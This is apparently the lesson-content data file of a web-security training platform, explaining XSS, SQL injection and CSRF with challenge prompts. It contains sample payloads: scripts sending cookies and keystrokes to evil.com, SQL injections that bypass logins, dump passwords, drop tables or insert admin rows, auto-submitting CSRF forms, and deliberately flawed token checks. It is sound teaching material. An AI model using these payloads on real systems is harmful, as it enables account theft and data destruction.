export const LEARN_CONTENT = {
  xss: {
    title: "Cross-Site Scripting (XSS)",
    color: "cyan",
    sections: [
      {
        type: "intro",
        heading: "What is XSS?",
        body: "Cross-Site Scripting (XSS) lets an attacker inject their own JavaScript into a webpage that other users visit. Instead of attacking the server directly, you're attacking the people using the site.",
      },
      {
        type: "flow",
        heading: "How does it work?",
        steps: [
          { icon: "🧑‍💻", label: "Attacker", detail: "Types malicious script into an input field" },
          { icon: "🌐",    label: "Server",   detail: "Saves or reflects the input without sanitizing it" },
          { icon: "👤",    label: "Victim",   detail: "Loads the page — the script runs in their browser" },
          { icon: "💀",    label: "Exploit",  detail: "Cookies stolen, page defaced, keystrokes logged" },
        ],
      },
      {
        type: "code",
        heading: "What a basic payload looks like",
        language: "html",
        code: `<!-- Normal comment input -->
<input value="Hello!" />

<!-- XSS payload injected instead -->
<input value=""><script>alert('XSS')</script>" />

<!-- The browser sees and executes the script -->`,
      },
      {
        type: "injection",
        heading: "How injection works",
        before: {
          label: "Server template (vulnerable)",
          code: `<div class="comment">\n  {userInput}\n</div>`,
          highlight: "{userInput}",
          caption: "The server pastes the user's input directly into the HTML — no cleaning, no escaping.",
        },
        after: {
          label: "What the browser receives",
          code: `<div class="comment">\n  <script>alert('xss')</script>\n</div>`,
          highlight: "<script>alert('xss')</script>",
          caption: "The browser sees a real script tag and executes it immediately — it has no way to tell it wasn't always there.",
        },
      },
      {
        type: "cards",
        heading: "Why is it dangerous?",
        items: [
          {
            icon: "🍪",
            title: "Cookie Theft",
            side: "left",
            body: "Steal session cookies to log in as the victim.",
            code: `// Injected into a vulnerable page
<script>
  // Grab the victim's session cookie
  const stolen = document.cookie;

  // Send it to the attacker's server
  fetch("https://evil.com/steal?c=" + stolen);
</script>`,
          },
          {
            icon: "🎣",
            title: "Phishing",
            side: "right",
            body: "Inject fake login forms to capture credentials.",
            code: `// Injected into a vulnerable page
<script>
  // Replace the page with a fake login form
  document.body.innerHTML = \`
    <form action="https://evil.com/capture">
      <p>Session expired. Please log in again.</p>
      <input name="user" placeholder="Username" />
      <input name="pass" placeholder="Password" type="password"/>
      <button>Login</button>
    </form>
  \`;
</script>`,
          },
          {
            icon: "🖥️",
            title: "Page Defacement",
            side: "left",
            body: "Modify what the victim sees on the page.",
            code: `// Injected into a vulnerable page
<script>
  // Wipe the entire page content
  document.body.innerHTML = \`
    <div style="background:#000;color:red;
                font-size:48px;text-align:center">
      <br/><br/>
      💀 You've been hacked 💀
    </div>
  \`;
</script>`,
          },
          {
            icon: "⌨️",
            title: "Keylogging",
            side: "right",
            body: "Record every keystroke the victim types.",
            code: `// Injected into a vulnerable page
<script>
  let log = "";

  // Listen to every key the victim presses
  document.addEventListener("keydown", (e) => {
    log += e.key;

    // Send to attacker every 5 seconds
    if (log.length % 20 === 0) {
      fetch("https://evil.com/keys?k=" + log);
    }
  });
</script>`,
          },
        ],
      },
      {
        type: "types",
        heading: "Three types of XSS",
        items: [
          { name: "Reflected",  color: "yellow", desc: "Payload is in the URL. Only affects users who click the crafted link." },
          { name: "Stored",     color: "orange", desc: "Payload is saved to the database. Affects every user who loads the page." },
          { name: "DOM-based",  color: "red",    desc: "Payload manipulates the page's DOM directly via JavaScript." },
        ],
      },
      {
        type: "cta",
        heading: "Ready to practice?",
        body: "You'll start with reflected XSS — the simplest form. Your goal is to inject a script into a vulnerable comment board.",
      },
    ],
  },

  sqli: {
    title: "SQL Injection (SQLi)",
    color: "orange",
    sections: [
      {
        type: "intro",
        heading: "What is SQL Injection?",
        body: "SQL Injection happens when a website pastes user input directly into a database query. By typing carefully crafted text, an attacker can change what the query does — bypass logins, dump entire tables, or destroy data. Where XSS attacks other users in the browser, SQLi attacks the database itself.",
      },
      {
        type: "flow",
        heading: "How does it work?",
        steps: [
          { icon: "🧑‍💻", label: "Attacker", detail: "Types crafted SQL into a form field, search box, or URL parameter" },
          { icon: "🌐",    label: "Server",   detail: "Pastes the input directly into a SQL string instead of using a parameter" },
          { icon: "🗄️",    label: "Database", detail: "Executes the rewritten query as one trusted command" },
          { icon: "💀",    label: "Exploit",  detail: "Login bypassed, tables dumped, data deleted, admin row inserted" },
        ],
      },
      {
        type: "code",
        heading: "What a basic payload looks like",
        language: "sql",
        filename: "login.sql",
        code: `-- The query the developer wrote (username + password from the form)
SELECT * FROM users
WHERE username = 'alice' AND password = 'hunter2';

-- Attacker types this into the username field: admin' --
-- The server pastes it in without escaping the quote:
SELECT * FROM users
WHERE username = 'admin' --' AND password = '';
--                       ^^ everything after -- is ignored as a comment

-- The query now returns the admin row without checking any password.`,
      },
      {
        type: "cards",
        heading: "Why is it dangerous?",
        items: [
          {
            icon: "🔓",
            title: "Authentication Bypass",
            side: "left",
            language: "sql",
            filename: "bypass.sql",
            body: "Log in as any user without knowing their password.",
            code: `-- Username field gets:    admin' --
-- Final query the database sees:

SELECT * FROM users
WHERE username = 'admin' --' AND password = '';

-- The "--" comments out the password check.
-- Server gets back the admin row → you are logged in as admin.`,
          },
          {
            icon: "📤",
            title: "Data Exfiltration",
            side: "right",
            language: "sql",
            filename: "dump.sql",
            body: "Dump tables you should never have access to.",
            code: `-- Search box query:
SELECT name, price FROM products WHERE name LIKE '%shoes%';

-- Attacker types:    ' UNION SELECT username, password FROM users --

SELECT name, price FROM products WHERE name LIKE '%'
UNION SELECT username, password FROM users --%';

-- The page now lists every username and password
-- alongside the normal product results.`,
          },
          {
            icon: "💥",
            title: "Database Destruction",
            side: "left",
            language: "sql",
            filename: "destroy.sql",
            body: "Wipe entire tables with one crafted input.",
            code: `-- Comment ID from URL:    ?id=42
DELETE FROM comments WHERE id = 42;

-- Attacker changes the URL to:    ?id=42; DROP TABLE users--

DELETE FROM comments WHERE id = 42;
DROP TABLE users;
--

-- Two statements run back-to-back. The users table is gone.`,
          },
          {
            icon: "👑",
            title: "Privilege Escalation",
            side: "right",
            language: "sql",
            filename: "escalate.sql",
            body: "Insert your own row into the admin table.",
            code: `-- Sign-up form sends username + email
INSERT INTO users (username, email, role)
VALUES ('bob', 'bob@x.com', 'user');

-- Attacker types this as the email:
--    x'); INSERT INTO users VALUES ('me','me@x.com','admin') --

INSERT INTO users (username, email, role)
VALUES ('bob', 'x'); INSERT INTO users VALUES
('me','me@x.com','admin') --', 'user');

-- A second INSERT runs — creating an admin account they own.`,
          },
        ],
      },
      {
        type: "types",
        heading: "Three types of SQL Injection",
        items: [
          { name: "Classic",    color: "yellow", desc: "Results come straight back in the page. Easiest to exploit — you can see what the database returns." },
          { name: "Blind",      color: "orange", desc: "No visible output. The attacker asks yes/no questions and infers data from how the page changes." },
          { name: "Time-based", color: "red",    desc: "No output, no errors. The attacker uses SLEEP() and measures response time to extract one bit at a time." },
        ],
      },
      {
        type: "code",
        heading: "Step 0: Map the database before you inject",
        language: "sql",
        filename: "recon.sql",
        code: `-- List every table the database knows about
SHOW TABLES;
-- result: products | users | orders | ...

-- Inspect a table's columns by fetching one row
SELECT * FROM users LIMIT 1;
-- result: id=1, username=admin, password=..., role=admin

-- SQL-standard alternative (works on most databases)
SELECT TABLE_NAME  FROM INFORMATION_SCHEMA.TABLES;
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
  WHERE TABLE_NAME = 'users';`,
      },
      {
        type: "cta",
        heading: "Ready to practice?",
        body: "You'll start with a classic SQLi login bypass. Use the SQL Terminal in the challenge to explore the database first — then inject through the login form.",
      },
    ],
    bridgeLectures: {
      "union-recon": {
        title: "UNION Injection & Schema Discovery",
        sections: [
          {
            type: "intro",
            heading: "Reading data you were never meant to see",
            body: "You already know how to break out of a SQL string. The next step is to read data from tables the application never intended to expose. That requires two things: knowing what tables and columns exist (recon), and understanding how UNION SELECT appends a second query's rows onto the first.",
          },
          {
            type: "code",
            heading: "Phase 1 — Discover the schema",
            language: "sql",
            filename: "recon.sql",
            code: `-- List all tables in the database
SHOW TABLES;
-- result: books, members

-- See a table's column names by fetching one row
SELECT * FROM members LIMIT 1;
-- result: id | email | membership_key

-- Standard SQL alternative
SELECT TABLE_NAME  FROM INFORMATION_SCHEMA.TABLES;
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
  WHERE TABLE_NAME = 'members';`,
          },
          {
            type: "injection",
            heading: "Phase 2 — Count the columns",
            before: {
              label: "Original query (3 columns)",
              code: `SELECT id, title, author
FROM books
WHERE genre = 'Fiction'`,
              highlight: "id, title, author",
              caption: "The app returns 3 columns. Your UNION must return exactly 3 — any mismatch is an error.",
            },
            after: {
              label: "Probe with ORDER BY",
              code: `' ORDER BY 3 --   ← no error (3 cols exist)
' ORDER BY 4 --   ← error! (col 4 doesn't exist)

' UNION SELECT 1,2,3 --
-- appends a row: 1 | 2 | 3
-- confirms positions`,
              highlight: "' ORDER BY 4 --   ← error!",
              caption: "Increment N in ORDER BY until you get an error. The last number that worked is the column count.",
            },
          },
          {
            type: "code",
            heading: "Phase 3 — The UNION rules",
            language: "sql",
            filename: "union-rules.sql",
            code: `-- Rule 1: same number of columns
SELECT id, title, author FROM books ...
UNION
SELECT id, email, membership_key FROM members
--     ↑    ↑          ↑
--     3    columns    match ✓

-- Rule 2: column positions map left-to-right
-- The id slot of books shows the id slot of members.
-- Use filler values (1, NULL, 'x') for slots you don't care about.

-- Rule 3: comment out the remainder of the original query
' UNION SELECT 1, email, membership_key FROM members --
--                                                   ^^
--                           kills the trailing ' from the WHERE template`,
          },
          {
            type: "injection",
            heading: "Putting it together",
            before: {
              label: "Vulnerable catalogue query",
              code: `SELECT id, title, author
FROM books
WHERE genre = '{input}'`,
              highlight: "{input}",
              caption: "Three columns. Input lands inside single quotes in the WHERE clause — a quote breaks out of the string.",
            },
            after: {
              label: "After UNION injection",
              code: `SELECT id, title, author FROM books
WHERE genre = ''
UNION SELECT 1, email, membership_key
FROM members --'`,
              highlight: "UNION SELECT 1, email, membership_key\nFROM members",
              caption: "The original SELECT returns book rows. The injected UNION appends every member row — private credentials appear alongside the catalogue results.",
            },
          },
          {
            type: "cta",
            heading: "Ready for the next challenge?",
            body: "The portal you're about to face has more than one table. Use the SQL Terminal to map the schema, count the columns the query returns, then craft a UNION SELECT through the vulnerable input to surface the hidden data.",
            challengeIndex: 1,
            buttonLabel: "Go to Challenge 2 →",
          },
        ],
      },
      "stacked-queries": {
        title: "Stacked Queries",
        sections: [
          {
            type: "intro",
            heading: "Chaining a second statement",
            body: "Every injection so far modified the shape of one SQL statement — adding conditions, appending UNION rows. A semicolon goes further: it ends the current statement entirely and lets you write a second, completely independent command. The database runs both in sequence. That second command can be anything: DELETE, INSERT, UPDATE, DROP — whatever the database user is allowed to execute.",
          },
          {
            type: "injection",
            heading: "How the semicolon creates a second statement",
            before: {
              label: "Original filter query",
              code: `SELECT id, subject, priority
FROM tickets
WHERE priority = '{input}'`,
              highlight: "{input}",
              caption: "Input lands inside single quotes. A quote alone breaks the string — but a semicolon ends the statement.",
            },
            after: {
              label: "After stacked injection",
              code: `SELECT id, subject, priority FROM tickets
WHERE priority = ''
;
DELETE FROM tickets WHERE 1=1
--'`,
              highlight: "DELETE FROM tickets WHERE 1=1",
              caption: "Statement 1 (SELECT) returns nothing — priority = '' matches no rows. Statement 2 (DELETE) runs independently and wipes every ticket. The -- comments out the leftover quote.",
            },
          },
          {
            type: "code",
            heading: "Why WHERE 1=1 wipes everything",
            language: "sql",
            filename: "delete.sql",
            code: `-- 1=1 is always true — it matches every row in the table
DELETE FROM tickets WHERE 1=1;
-- equivalent to: DELETE FROM tickets;

-- Compare with a targeted delete:
DELETE FROM tickets WHERE priority = 'Low';
-- only removes low-priority tickets

-- You can also use stacked queries to escalate privileges:
'; INSERT INTO accounts (username, password, role)
   VALUES ('hacker', 'pw', 'admin') --

-- or to silently overwrite data:
'; UPDATE accounts SET password = 'owned' WHERE 1=1 --`,
          },
          {
            type: "flow",
            heading: "The stacked query attack flow",
            steps: [
              { icon: "🔍", label: "Find the field",   detail: "Any input that lands in a WHERE clause without parameterization" },
              { icon: "✂️",  label: "Close the string", detail: "A single quote ' ends the current string value" },
              { icon: "⛓️",  label: "Chain with ;",     detail: "Semicolon terminates statement 1 and opens statement 2" },
              { icon: "💥",  label: "Write statement 2", detail: "DELETE, INSERT, UPDATE, DROP — any valid SQL the DB user can run" },
              { icon: "💬",  label: "Comment the tail",  detail: "-- silences the leftover quote from the original template" },
            ],
          },
          {
            type: "cta",
            heading: "Ready for the next challenge?",
            body: "The portal ahead filters records by a field value — your input lands directly in the WHERE clause. Use the SQL Terminal to understand what's stored, then chain a second statement through the vulnerable input to cause a destructive change.",
            challengeIndex: 2,
            buttonLabel: "Go to Challenge 3 →",
          },
        ],
      },
    },
  },

  csrf: {
    title: "Cross-Site Request Forgery (CSRF)",
    color: "purple",
    sections: [
      {
        type: "module-intro",
        sections: [
          {
            heading: "HTTP is stateless",
            body: "Every HTTP request arrives at the server with no memory of the last one. When you log in, the server doesn't 'remember' you — it can't. So it hands the browser a session cookie: a unique token that proves who you are.",
          },
          {
            heading: "What a cookie is",
            body: "A cookie is a small key-value pair the server asks the browser to store. The browser attaches it automatically to every future request to that domain — you never have to do anything. This is what makes 'stay logged in' work.",
            code: `// Server sets a cookie after login:
Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Lax

// Browser attaches it automatically on every request:
GET /dashboard HTTP/1.1
Cookie: session_id=abc123`,
          },
          {
            heading: "Cookie security flags",
            body: "Three flags control how safely a cookie behaves. HttpOnly stops JavaScript from reading it (blocks XSS theft). Secure means HTTPS only. SameSite controls whether the browser sends it on cross-site requests — and that's exactly what CSRF exploits when it's missing or too permissive.",
          },
        ],
      },
      {
        type: "csrf-flow",
      },
      {
        type: "intro",
        heading: "What is CSRF?",
        body: "Cross-Site Request Forgery tricks a victim's browser into making a request to a site they're already logged in to — without them knowing. The attack doesn't steal credentials or inject code. It weaponises the browser's own behaviour: the automatic attachment of session cookies to every matching request.",
      },
      {
        type: "cards",
        heading: "Why is it dangerous?",
        items: [
          {
            icon: "💸",
            title: "Unauthorised Actions",
            side: "left",
            body: "Change email, transfer funds, delete accounts — any state-changing action the victim can do, CSRF can do on their behalf.",
            code: `<!-- Attacker's page — victim never sees this -->
<img src="https://bank.com/transfer?to=attacker&amount=1000">
<!-- Browser fires GET, attaches session cookie, transfer succeeds -->`,
          },
          {
            icon: "🔑",
            title: "Account Takeover",
            side: "right",
            body: "Change the victim's password or email to one the attacker controls — then log in as them at leisure.",
            code: `<form method="POST" action="https://app.com/change-email">
  <input name="email" value="attacker@evil.com">
  <input name="csrf_token" value="ignored">
</form>
<script>document.forms[0].submit()</script>`,
          },
          {
            icon: "👤",
            title: "Invisible to the Victim",
            side: "left",
            body: "The victim sees nothing. The request fires in the background — no click, no prompt, no warning.",
            code: `<!-- A 1x1 invisible image is enough for a GET-based CSRF -->
<img src="https://target.com/action" width="0" height="0">`,
          },
          {
            icon: "🌐",
            title: "No Code Injection Needed",
            side: "right",
            body: "Unlike XSS, CSRF doesn't inject any code into the target site. It exploits legitimate browser behaviour — making it harder to detect and filter.",
            code: `// XSS: attacker's code runs ON the target site
// CSRF: attacker's page makes the browser call the target site
// The target site sees a perfectly normal authenticated request`,
          },
        ],
      },
      {
        type: "code",
        heading: "What a basic CSRF payload looks like",
        language: "html",
        code: `<!-- The attacker hosts this page anywhere -->
<!-- When the victim visits it while logged in to target.com: -->

<!-- GET-based CSRF (simplest — fires automatically on load) -->
<img src="https://target.com/change-email?email=attacker@evil.com">

<!-- POST-based CSRF (auto-submitting hidden form) -->
<form method="POST" action="https://target.com/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>`,
      },
      {
        type: "types",
        heading: "Three types of CSRF",
        items: [
          { name: "GET-based",    color: "yellow", desc: "Simplest form. A single <img> or <a> tag fires a GET request automatically. Any endpoint that changes state via GET is vulnerable." },
          { name: "POST-based",   color: "orange", desc: "A hidden auto-submitting form sends a POST request. Most state-changing endpoints use POST — so most real CSRF attacks look like this." },
          { name: "Token bypass", color: "red",    desc: "A CSRF token is present in the form but the server doesn't validate it — or accepts any value. The token is theatre, not protection." },
        ],
      },
      {
        type: "cta",
        heading: "Ready to practice?",
        body: "You'll start with the simplest CSRF: a GET request with no token. Your goal is to craft an attacker page that silently changes the victim's email.",
      },
    ],
    bridgeLectures: {
      "post-forms": {
        title: "POST Requests & Auto-Submitting Forms",
        sections: [
          {
            type: "intro",
            heading: "Why GET requests should never change state",
            body: "GET requests are supposed to be 'safe' — they retrieve data, not modify it. Browsers, proxies, and search engine crawlers freely follow GET links, which makes a GET-based state change catastrophically easy to exploit. Well-designed applications use POST (or PUT/DELETE) for any action that changes data.",
          },
          {
            type: "code",
            heading: "The hidden form pattern",
            language: "html",
            code: `<!-- The img tag trick no longer works — the endpoint requires POST -->
<!-- Instead, craft a hidden form that submits itself immediately -->

<form method="POST" action="https://target.com/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>
  // Submit the form the instant the attacker's page loads
  document.forms[0].submit();
</script>

<!-- The browser sends a POST with the victim's session cookie attached.
     The server sees a fully authenticated request and processes it. -->`,
          },
          {
            type: "flow",
            heading: "Why POST still doesn't help without a CSRF token",
            steps: [
              { icon: "🌐", label: "Victim visits attacker page", detail: "Logged in to the target site in another tab" },
              { icon: "📋", label: "Form auto-submits", detail: "JavaScript calls .submit() on the hidden form before the victim sees anything" },
              { icon: "🍪", label: "Browser attaches cookie", detail: "The session cookie goes along automatically — POST or GET, it doesn't matter" },
              { icon: "✅", label: "Server accepts it", detail: "The server sees a valid POST with a valid session — it has no way to tell the request didn't originate from its own page" },
            ],
          },
          {
            type: "cta",
            heading: "Try Challenge 2",
            body: "The endpoint now requires POST. Use the hidden form pattern to trigger the action.",
            buttonLabel: "Go to Challenge 2 →",
          },
        ],
      },
      "csrf-tokens": {
        title: "CSRF Tokens & How They Fail",
        sections: [
          {
            type: "intro",
            heading: "The intended defence: CSRF tokens",
            body: "A CSRF token is a secret, per-session, unpredictable value embedded in every form. When the form is submitted, the server checks that the token matches the one it issued for this session. Because an attacker's page can't read the token from the target site (blocked by the Same-Origin Policy), it can't forge a valid request.",
          },
          {
            type: "code",
            heading: "What correct CSRF token validation looks like",
            language: "python",
            code: `# Server generates a token and stores it in the session
session['csrf_token'] = secrets.token_hex(32)

# Server embeds it in the form
# <input type="hidden" name="csrf_token" value="{{ session.csrf_token }}">

# On form submission, the server validates it:
if request.form['csrf_token'] != session['csrf_token']:
    abort(403)  # Reject — token mismatch`,
          },
          {
            type: "cards",
            heading: "Three ways CSRF tokens fail",
            items: [
              {
                icon: "🚫",
                title: "Token present, not checked",
                side: "left",
                body: "The most common failure: the token exists in the form, but the server never actually validates it. Any value — or no value — is accepted.",
                code: `# Vulnerable: token is generated but never checked
@app.post("/change-email")
def change_email():
    new_email = request.form['email']
    # csrf_token is in the form but ignored here
    update_email(current_user, new_email)`,
              },
              {
                icon: "🔁",
                title: "Token not tied to session",
                side: "right",
                body: "The token is validated, but any valid token for any user is accepted. An attacker who has their own account can reuse their own token in a forged request against any victim.",
                code: `# Vulnerable: checks token exists in DB, not that it matches this session
if CsrfToken.find(token=request.form['csrf_token']):
    proceed()  # Any token from any session works`,
              },
              {
                icon: "📭",
                title: "Blank token accepted",
                side: "left",
                body: "The validation logic fails open: if the token field is empty or missing, the check is skipped entirely.",
                code: `# Vulnerable: falsy token skips the check
token = request.form.get('csrf_token')
if token and token != session['csrf_token']:
    abort(403)
# If token is '' or missing, the if-block is skipped — request proceeds`,
              },
            ],
          },
          {
            type: "cta",
            heading: "Try Challenge 3",
            body: "The form has a CSRF token field — but the server doesn't validate it. Submit any value and watch it succeed.",
            buttonLabel: "Go to Challenge 3 →",
          },
        ],
      },
    },
  },
};
